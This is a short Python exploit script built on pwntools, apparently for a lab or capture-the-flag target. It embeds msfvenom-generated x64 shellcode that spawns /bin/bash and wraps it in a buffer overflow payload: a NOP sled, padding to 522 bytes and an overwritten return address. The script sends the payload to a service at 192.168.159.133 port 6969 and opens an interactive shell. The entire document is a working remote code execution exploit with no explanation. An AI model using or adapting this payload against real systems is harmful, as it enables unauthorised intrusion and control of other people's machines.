from pwn import *
from struct import *

# msfvenom -p linux/x64/exec -v shell -f py CMD="/bin/bash"
shell =  ""
shell += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
shell += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
shell += "\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61"
shell += "\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05"

buf =  "\x02\x02\x00"
buf += "\x90" * 20
buf += shell
buf += "\x90"*(522-len(shell))
buf += pack("<Q", 0x600de0)

host = "192.168.159.133"
port = 6969

try:
    p = remote(host, port)
    p.sendline(buf)
    p.interactive()
except EOFError as e:
    log.error(e)
finally:
    with context.quiet:
        p.close()